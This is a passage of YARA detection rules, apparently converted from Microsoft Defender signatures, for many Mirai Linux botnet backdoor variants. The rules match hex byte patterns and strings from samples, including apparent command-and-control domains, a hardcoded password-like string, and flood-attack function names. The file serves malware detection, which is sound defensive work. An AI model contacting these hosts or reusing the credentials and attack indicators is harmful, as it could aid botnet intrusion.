        detection_name = "Backdoor:Linux/Mirai.DS!MTB"
        threat_id = "2147851372"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 ca e6 e7 e7 ec ea fd e0 e6 e7 b3 a9 c2 ec ec f9 a4 c8 e5 e0 ff ec 89 00 bb b9 a8 dc d3 9b 99 93 95 8c d3 c3 9e 9d 8e 99 da 95 8c 8a c1 c8 da 8e 99 8f c1 cd ca dc b4 a8 a8 ac d3 cd d2 cc fc 00 24 29 20 20 23 3b 23 3e 20 28 4c 00}  //weight: 1, accuracy: High
        $x_1_2 = {42 33 55 57 59 6d 4e 4d 74 43 72 66 50 67 63 75 4b 7a 32 34 62 53 73 4c 78 37 41 58 51 4a 47 61 68 39 38 65 77 69 76 46 54 4f 45 52 64 5a 2f 6c 31 49 36 6e 6a 35 48 70 6b 79 56 30 6f 71 2e 00 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DT_2147851373_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DT!MTB"
        threat_id = "2147851373"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {20 21 92 e3 00 00 8f bc 00 18 10 60 00 65 00 00 00 00 02 e0 10 21 8f bf 10 fc 8f be 10 f8 8f b7 10 f4 8f b6 10 f0 8f b5 10 ec 8f b4 10 e8 8f b3 10 e4 8f b2 10 e0 8f b1 10 dc 8f b0 10 d8 03 e0 00 08 27 bd 11 00 8f 99 82}  //weight: 1, accuracy: High
        $x_1_2 = {10 21 30 42 ff ff af a2 10 c0 3c 02 08 08 34 42 08 08 24 03 01 00 af a2 00 30 8f a2 10 c0 a6 23 00 02 27 a3 00 3c a6 22 00 00 24 14 ff ff a4 e6 00 02 a6 06 00 01 af a3 10 cc af a4 10 d0 24 1e 00 05 12 74 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DU_2147851374_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DU!MTB"
        threat_id = "2147851374"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TCPpayloadToBytes" ascii //weight: 1
        $x_1_2 = "attack_get_opt_ip" ascii //weight: 1
        $x_1_3 = "attack_method_udp2flood" ascii //weight: 1
        $x_1_4 = "attack_remove_id" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DW_2147852377_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DW!MTB"
        threat_id = "2147852377"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {3c 50 9f e5 3c 60 9f e5 00 30 95 e5 00 20 96 e5 34 e0 9f e5 34 40 9f e5 83 35 23 e0 a2 09 22 e0 00 10 9e e5 00 c0 94 e5 00 00 23 e0 23 04 20 e0 00 10 85 e5 00 c0 8e e5 00 20 84 e5 00 00 86 e5}  //weight: 10, accuracy: High
        $x_10_2 = {75 20 8b 29 89 c8 29 e8 8b 70 08 8b 50 0c 8b 4e 0c 39 c1 75 3d 39 4a 08 75 38 01 ef 89 56 0c 89 72 08}  //weight: 10, accuracy: High
        $x_1_3 = "kuck.tech" ascii //weight: 1
        $x_1_4 = "TCP Connect" ascii //weight: 1
        $x_1_5 = "TSource Engine Query" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_DV_2147852390_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DV!MTB"
        threat_id = "2147852390"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "00sax0asfd00ddd.loseyourip.com" ascii //weight: 1
        $x_1_2 = {7b 36 3d 3a 7b 36 21 27 2d 36 3b 2c 74 3f 3d 38 38 74 79 6d 74 54 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DX_2147852443_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DX!MTB"
        threat_id = "2147852443"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "/bin/busybox BOT" ascii //weight: 5
        $x_1_2 = "/proc/net/tcp" ascii //weight: 1
        $x_1_3 = "/cpuinfo" ascii //weight: 1
        $x_1_4 = "misc/watchdog" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_DZ_2147852954_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DZ!MTB"
        threat_id = "2147852954"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 c2 83 ee 02 c1 e2 0b 31 c2 44 89 c0 c1 e8 13 89 d1 44 31 c0 c1 e9 08 31 c2 31 d1 66 89 0f 48 83 c7 02}  //weight: 1, accuracy: High
        $x_1_2 = "/usr/compress/bin/" ascii //weight: 1
        $x_1_3 = "mnt/mtd/app/gui" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EB_2147888608_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EB!MTB"
        threat_id = "2147888608"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox" ascii //weight: 1
        $x_1_2 = "cundi.m68k" ascii //weight: 1
        $x_1_3 = "anko-app/ankosample _8182T_1104" ascii //weight: 1
        $x_1_4 = "/root/dvr_gui/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EC_2147889307_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EC!MTB"
        threat_id = "2147889307"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {34 97 69 88 78 c0 00 00 34 82 63 82 00 00 00 00 34 84 76 83 77 86 75 8a 00 00 00 00 34 81 7f c8 00 00 00 00 34 97 69 88 78 c0 68 8a 77 71 34 72 63 6a 00 00 34 97 69 88 78 c0 75 8a 6f 38 6f 74 6b 00 00 00 68 88 78 8c 7e 9b 21 b4 00 00 00 00 2b d7 2b d7 2b df 2b df 00 00 00 00 35 94 74 00 34 8a 7a 97 68 00 00 00 34 83 7e 91 34 9a 69 8e 75 73 74 7a 00 00 00 00 49 d0 68 b7 6a d6 4f dd}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_ED_2147890021_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.ED!MTB"
        threat_id = "2147890021"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 38 f7 f1 29 04 a2 a6 db 3b 60 8d a0 6c 34 da b4 3a 80 f4 31 02 89 34 73 19 88 be 99 5f 98 0e 32 54 ae 03 d6 12 0f 27 80 42 05 de d8 5e b4 e0 a6 40 cd 53 f6 2e 9c 2a 07 36 5b fa 9f 7c f0 2e cb 1a 53 8d 95 7a 07 9f 4f 12 df a9 0f 66 40 d3 84}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DY_2147890543_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DY!MTB"
        threat_id = "2147890543"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 25 20 89 00 25 50 45 01 25 30 cb 00 40 6b 0d 00 00 73 0e 00 c0 62 0c 00 80 7a 0f 00 80 00 b0 af 34 00 a3 af 30 00 a4 af 2c 00 aa af 28 00 a6 af 25 a8 e8 00 70 00 ad af 74 00 ae af 78 00 ac af 7c 00 af af}  //weight: 1, accuracy: High
        $x_1_2 = {06 00 1c 3c ?? ?? 9c 27 21 e0 99 03 e0 ff bd 27 10 00 bc af 1c 00 bf af 18 00 bc af 01 00 11 04 00 00 00 00 06 00 1c 3c ?? ?? 9c 27 21 e0 9f 03 20 80 99 8f 00 00 00 00 dc 01 39 27 09 f8 20 03 00 00 00 00 10 00 bc 8f 00 00 00 00 01 00 11 04}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EA_2147893577_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EA!MTB"
        threat_id = "2147893577"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tedzbot" ascii //weight: 1
        $x_1_2 = "/var/Sofia" ascii //weight: 1
        $x_1_3 = "/etc/init.d/nothing" ascii //weight: 1
        $x_1_4 = {00 50 a0 e3 7c c1 8e e5 05 1a 8d e2 05 2a 8d e2 51 cc 8d e2 80 51 8e e5 7c c0 8c e2 cc 10 81 e2 4c 20 82 e2 05 30 a0 e1 0a 00 a0 e1 00 c0 8d e5 49 fd ff eb 00 40 a0 e1 05 00 a0 e1 a6 fd ff eb 05 00 54 e1 44 00 8d e5 55 ff ff da 18 80 9d e5 34 50 8d e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_ES_2147894239_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.ES!MTB"
        threat_id = "2147894239"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8e 64 38 f4 00 10 10 80 00 44 10 21 8c 43 00 00 02 20 c8 21 8c 64 00 00 03 20 f8 09 00 00 00 00 26 03 00 01 92 a2 38 f8 30 70 00 ff 02 02 10 2b 8f bc 00 10 14 40 ff f2}  //weight: 1, accuracy: High
        $x_1_2 = "/bin/busybox" ascii //weight: 1
        $x_1_3 = "Killing all running attacks" ascii //weight: 1
        $x_1_4 = "Committing Suicide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EG_2147897546_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EG!MTB"
        threat_id = "2147897546"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VapeBot/Killer/" ascii //weight: 1
        $x_1_2 = {00 5b 56 61 70 65 42 6f 74 2f 4b 69 6c 6c 65 72 2f 45 58 45 5d 20 4b 69 6c 6c 65 64 20 70 72 6f 63 65 73 73 3a 20 25 73 2c 20 50 49 44 3a 20 25 64}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EF_2147897547_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EF!MTB"
        threat_id = "2147897547"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/anko-app/" ascii //weight: 1
        $x_1_2 = {73 65 72 76 69 63 65 73 07 5f 64 6e 73 2d 73 64 04 5f 75 64 70 05 6c 6f 63 61 6c}  //weight: 1, accuracy: High
        $x_1_3 = "urn:dial-multiscreen-org:service:dial:1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KL_2147899552_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KL!MTB"
        threat_id = "2147899552"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {92 10 00 02 80 a2 80 01 02 80 00 08 84 00 a0 08 86 00 e0 01 80 a2 00 03 32 bf ff fa}  //weight: 1, accuracy: High
        $x_1_2 = {18 80 00 04 80 a6 60 04 81 c7 e0 08 81 e8 00 00 02 bf ff fe}  //weight: 1, accuracy: High
        $x_1_3 = {86 00 7f 54 82 00 60 04 80 a0 60 80 12 bf ff fd}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EY_2147899553_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EY!MTB"
        threat_id = "2147899553"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {49 83 ec 01 72 20 4d 8b 7d f8 49 8b 6d 00 4c 89 ff ff 55 00 48 8b 75 08 4c 89 ff e8 3d 01 00 00 49 83 c5 10 eb da}  //weight: 1, accuracy: High
        $x_1_2 = {74 10 48 8b b3 c0 00 00 00 48 c1 e6 02 e8 03 01 00 00 8b 7b 18}  //weight: 1, accuracy: High
        $x_1_3 = {48 89 df e8 aa 6f 01 00 a8 01 74 17 49 8d 4e 01 48 8b 44 24 28 42 88 14 30 49 89 ce 49 ff cf 75 df}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EE_2147899648_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EE!MTB"
        threat_id = "2147899648"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 c6 8f e2 15 ca 8c e2 60 fa bc e5 00 c6 8f e2 15 ca 8c e2 58 fa bc e5 00 c6 8f e2 15 ca 8c e2 50 fa bc e5 00 c6 8f e2 15 ca 8c e2 48 fa bc e5 00 c6 8f e2 15 ca 8c e2 40 fa bc e5 00 c6 8f e2 15 ca 8c e2 38 fa bc e5 00 c6 8f e2 15 ca 8c e2 30 fa bc e5 00 c6 8f e2 15 ca 8c e2 28 fa bc e5 00 c6 8f e2 15 ca 8c e2 20 fa bc e5 00 c6 8f e2 15 ca 8c e2 18 fa bc e5 00 c6 8f e2 15 ca 8c e2 10 fa bc e5 00 c6 8f e2 15 ca 8c e2 08 fa bc e5 00 c6 8f e2 15 ca 8c e2 00 fa bc e5 30 40 2d e9 5c 50 9f e5 00 30 d5 e5 00 00 53 e3 30 80 bd 18 50 40 9f e5 00 30 94 e5 00 20 93 e5 00 00 52 e3 07 00 00 0a 04 30 83 e2 00 30 84 e5 0f e0 a0 e1 02 f0 a0 e1 00 30 94 e5 00 20 93 e5 00 00 52 e3 f7 ff ff 1a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EJ_2147900999_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EJ!MTB"
        threat_id = "2147900999"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {34 97 69 88 78 c0 68 8a 77 71 34 72 63 6a 00}  //weight: 1, accuracy: High
        $x_1_2 = {34 83 7e 91 34 9a 69 8e 75 73 74 7a}  //weight: 1, accuracy: High
        $x_1_3 = {2e 73 68 73 74 72 74 61 62 00 2e 69 6e 69 74 00 2e 74 65 78 74 00 2e 66 69 6e 69 00 2e 72 6f 64 61 74 61 00 2e 63 74 6f 72 73 00 2e 64 74 6f 72 73 00 2e 64 61 74 61}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EI_2147901531_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EI!MTB"
        threat_id = "2147901531"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "beardropper" ascii //weight: 1
        $x_1_2 = "t0talc0ntr0l4!" ascii //weight: 1
        $x_1_3 = {80 a0 7f ff 12 80 00 11 c4 07 bf dc 40 00 01 3b 01 00 00 00 40 00 01 19 a0 10 00 08 80 a4 00 08 12 80 00 15 90 10 20 00 40 00 01 24 01 00 00 00 40 00 01 02 a0 10 00 08 80 a4 00 08 12 80 00 0e 90 10 20 00 c4 07 bf dc 80 a0 bf ff}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EZ_2147901585_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EZ!MTB"
        threat_id = "2147901585"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {10 c0 00 09 00 80 10 21 00 86 30 21 90 a2 00 00 00 00 00 00 a0 82 00 00 24 84 00 01 14 86 ff fb 24 a5 00 01 00 80 10 21 03 e0 00 08}  //weight: 1, accuracy: High
        $x_1_2 = "wabjtam" ascii //weight: 1
        $x_1_3 = "beardropper" ascii //weight: 1
        $x_1_4 = "/bin/busybox" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EZ_2147901585_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EZ!MTB"
        threat_id = "2147901585"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {18 d0 4d e2 ba 02 00 eb 00 c0 dd e5 0e 00 5c e3 ?? ?? ?? ?? 0c 48 2d e9 00 b0 d0 e5 06 cc a0 e3 ab b1 a0 e1 1c cb a0 e1 0d b0 a0 e1 3a cd 8c e2 0c d0 4d e0 00 c0 93 e5 08 30 8d e5 04 c0 8d e5 00 20 8d e5 0c 30 8d e2 00 c0 a0 e3}  //weight: 1, accuracy: Low
        $x_1_2 = {01 20 52 e2 58 50 9d e5 00 30 a0 03 01 30 a0 13 01 b0 8b e2 05 00 5b e1 00 30 a0 23 01 30 03 32 01 70 d4 e4 00 00 53 e3 01 70 cc e4}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EM_2147901589_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EM!MTB"
        threat_id = "2147901589"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {7c 1c e8 ae 2f 80 00 3d 41 9e 01 40 39 7d 00 01 91 61 00 08 7f 83 e3 78 48 00 b7 4d 83 a1 00 08 7f 83 e8 00 41 9d ff dc}  //weight: 1, accuracy: High
        $x_1_2 = {41 9e 00 20 7f 63 db 78 7f 84 e3 78 7e 45 93 78 38 c0 00 01 48 00 b4 15 7c 63 f2 14 9b e3 08 44 7f 63 db 78}  //weight: 1, accuracy: High
        $x_1_3 = {93 bf 00 00 7e a4 ab 78 38 a0 28 00 38 c0 40 00 80 7e 00 00 48 01 0a 71 2c 03 00 00 41 82 02 fc 2f 83 ff ff 40 9e ff dc}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_FA_2147901928_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.FA!MTB"
        threat_id = "2147901928"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {10 73 00 55 24 02 00 09 10 62 00 53 24 02 00 01 10 e2 00 47 00 00 00 00 00 00 38 21 28 a2 00 07 10 40 00 05 24 84 00 01 80 83 00 00 24 c6 00 01 14 60 ff f3}  //weight: 1, accuracy: High
        $x_1_2 = "someoffdeeznuts" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EH_2147901966_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EH!MTB"
        threat_id = "2147901966"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 83 fa 20 48 89 d1 49 89 fa fc 76 53 48 89 f8 48 f7 d8 48 83 e0 07 48 29 c1 48 91 f3 a4 48 89 c1 48 83 e9 20 78 35 66 66 90 66 66 90 66 66 90 48 83 e9 20 48 8b 06 48 8b 56 08 4c 8b 46 10 4c 8b 4e 18 48 89 07 48 89 57 08 4c 89 47 10 4c 89 4f 18 48 8d 76 20 48 8d 7f 20 79 d4 48 83 c1 20 f3 a4 4c 89 d0 c3 90 90 45 31 c0 48 85 ff 41 ba 01 00 00 00 75 61 eb 76 48 0f be 07 4c 8b 0d b5 18 10 00 41 f6 04 41 08 74 64 31 d2 eb 15 6b d2 0a 0f be c1 8d 54 02 d0 81 fa ff 00 00 00 7f 4e 48 ff c7}  //weight: 1, accuracy: High
        $x_1_2 = {53 b8 64 00 00 00 0f 05 48 3d 00 f0 ff ff 48 89 c3 76 0f e8 6c d5 ff ff 89 da 48 83 cb ff f7 da 89 10 48 89 d8 5b c3}  //weight: 1, accuracy: High
        $x_1_3 = {48 8d 3c 28 48 89 c3 e8 b9 02 00 00 85 c0 79 04 48 83 cb ff 5a 48 89 d8 5b 5d c3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EK_2147902389_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EK!MTB"
        threat_id = "2147902389"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {7f e0 fe 70 83 81 00 10 7c 03 fa 78 83 a1 00 14 7c 63 00 50 80 01 00 24 7c 63 fe 70 83 e1 00 1c 7f c3 18 38 7c 08 03 a6 83 c1 00 18 38 21 00 20}  //weight: 2, accuracy: High
        $x_2_2 = {7c 08 02 a6 94 21 ff f0 93 e1 00 0c 7c 7f 1b 78 90 01 00 14 88 03 00 00 38 60 00 01 2f 80 00 00 41 9e 00 1c 7f e9 fb 78}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_QA_2147902850_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.QA!MTB"
        threat_id = "2147902850"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {02 80 00 06 92 10 20 14 90 06 20 08 40 00 0a 79 92 10 00 11 92 10 20 14 c0 36 e0 0a}  //weight: 1, accuracy: High
        $x_1_2 = {c2 0b 00 0b 82 03 40 01 9a 03 7f ff 82 18 40 02 c2 28 c0 00 86 00 ff ff 88 01 20 01 82 02 60 02 80 a1 00 01 32 bf ff f7}  //weight: 1, accuracy: High
        $x_1_3 = {12 80 00 0a 11 00 00 65 c2 0f bf d8 c2 2f bf da c2 0f bf d9 c0 2f bf dc c2 2f bf db 82 10 20 30 c2 2f bf d9 c2 2f bf d8 92 10 20 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_EL_2147903137_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.EL!MTB"
        threat_id = "2147903137"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {73 68 73 74 72 74 61 62 00 2e 69 6e 69 74 00 2e 74 65 78 74 00 2e 66 69 6e 69 00 2e 72 6f 64 61 74 61 00 2e 63 74 6f 72 73 00 2e 64 74 6f 72 73 00 2e 64 61 74 61 2e 72 65 6c 2e 72 6f 00 2e 64 61 74 61 00 2e 67 6f 74 00 2e 73 62 73 73 00 2e 62 73 73 00 2e 6d 64 65 62 75 67 2e 61 62 69 33 32}  //weight: 10, accuracy: High
        $x_10_2 = {18 8f bf 08 a4 8f be 08 a0 8f b7 08 9c 8f b6 08 98 8f b5 08 94 8f b4 08 90 8f b3 08 8c 8f b2 08 88 8f b1 08 84 8f b0 08 80 03 e0 00 08 27 bd 08 a8 34 42 08 08 10 00 fe e0 af a2 08 70 3c 02 40 06 34 42 40 06 10 00 fe dc af a2 08 70 34 42 2a 2a 10 00 fe d9 af a2 08 70 1a 60 ff 78 02 37 b0 21 10 00 ff 79 af a0 00 20 2c a2 00}  //weight: 10, accuracy: High
        $x_1_3 = "/tmp/condinetwork" ascii //weight: 1
        $x_1_4 = "99?*.`z.?\".u2.76v;**639;.354u\"2.76q\"76v;**639;.354u\"76a+gjtcv37;=?u-?8*vpupa+gjtbZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
